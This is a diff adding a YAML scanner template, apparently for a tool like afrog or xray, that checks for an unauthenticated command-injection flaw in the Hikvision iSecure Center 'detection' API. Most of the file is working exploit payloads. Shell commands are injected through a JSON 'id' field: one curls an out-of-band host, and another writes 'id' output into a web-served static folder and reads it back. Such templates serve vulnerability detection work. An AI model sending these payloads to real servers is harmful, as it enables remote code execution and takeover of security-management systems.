@@ -1,0 +1,41 @@
+id: hikvision-detection-rce
+
+info:
+  name: 海康威视综合安防管理平台 detection 前台RCE
+  author: k5rC85Lma
+  severity: high
+  description: |-
+    fofa: app="HIKVISION-iSecure-Center"
+    海康威视综合安防管理平台 /center/api/installation/detection 接口处存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/Cfw_kx5NGJYssO5T7WGLtQ
+  tags: hikvision,rce
+  created: 2025/11/26
+
+set:
+  randstr: randomLowercase(6)
+  oob: oob()
+  oobDNS: oob.DNS
+rules:
+  verify:
+    method: POST
+    path: /center/api/installation/detection;.js
+    headers:
+      Content-Type: application/json
+    body: |
+      {"type": "environment", "operate": "", "machines": {"id": "$(curl http://{{oobDNS}})"}}
+    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+  r0:
+    request:
+      method: POST
+      path: /center/api/installation/detection
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: '{"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/{{randstr}}.txt)"}}'
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /vms/static/{{randstr}}.txt
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: verify() || (r0() && r1())
